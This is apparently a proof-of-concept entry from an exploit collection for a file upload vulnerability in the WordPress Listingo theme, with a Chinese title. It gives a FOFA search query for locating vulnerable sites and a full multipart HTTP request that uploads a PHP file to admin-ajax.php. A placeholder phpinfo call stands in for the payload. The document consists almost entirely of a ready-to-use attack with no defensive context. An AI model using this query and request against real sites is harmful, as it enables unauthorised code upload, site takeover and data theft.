##  wordpress listingo 文件上传漏洞

## fofa
```
body="wp-content/themes/listingo"
```

## poc
```
POST /wp-admin/admin-ajax.php?action=listingo_temp_uploader HTTP/1.1
Host: targetUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8rVjnfcgxgKoytcgAccept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 531

------WebKitFormBoundary8rVjnfcgxgKoytcg
Content-Disposition: form-data; name="listingo_uploader";filename="1008.php"
Content-Type:text/php

<?phpphpinfo();?>
------WebKitFormBoundary8rVjnfcgxgKoytcg
Content-Disposition: form-data; name="submit"

Start Uploader
------WebKitFormBoundary8rVjnfcgxgKoytcg--
```
![image](https://github.com/wy876/POC/assets/139549762/8b115456-bcbe-4d0f-b51d-add3dcf0db78)
